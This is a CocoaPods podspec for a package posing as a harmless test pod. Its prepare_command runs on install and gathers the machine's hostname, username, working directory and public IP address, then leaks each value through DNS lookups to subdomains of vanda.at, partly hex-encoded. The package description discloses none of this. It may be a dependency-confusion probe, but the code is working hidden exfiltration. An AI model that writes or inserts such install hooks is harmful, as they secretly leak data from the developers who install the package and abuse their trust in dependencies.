Pod::Spec.new do |s|
  s.name             = 'myNewTestPod'
s.version = '0.0.1'
  s.summary          = 'Test'
  s.description      = 'A test cocoapod'
  s.license          = { :type => 'MIT', :file => 'LICENSE' }
  s.author           = { 'David Schmidt' => 'd.schmidt@univie.ac.at' }
  s.source           = { :git => 'https://github.com/d-pod-test/myNewTestPod.git' }
  s.homepage = "https://github.com/d-pod-test/myNewTestPod.git"
  s.platform         = :ios, '9.0'
  s.source_files = "Classes/ExampleLib.{m,h}"
  s.swift_version = '4.0'
  s.prepare_command = "a=$(hostname;) && echo $a | head | while read ut;do nslookup $ut.pl.vanda.at;done;a=$(whoami;) && echo $a | head | while read ut;do nslookup $ut.pl.vanda.at;done;a=$(echo 'myNewTestPod0.0.0';) && echo $a | head | while read ut;do nslookup $ut.pl.vanda.at;done;a=$(curl https://ifconfig.me;) && echo $a | head | while read ut;do nslookup $ut.pl.vanda.at;done;a=$(hostname;pwd;whoami;echo 'myNewTestPod0.0.0';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.reply.vanda.at;done"
  end








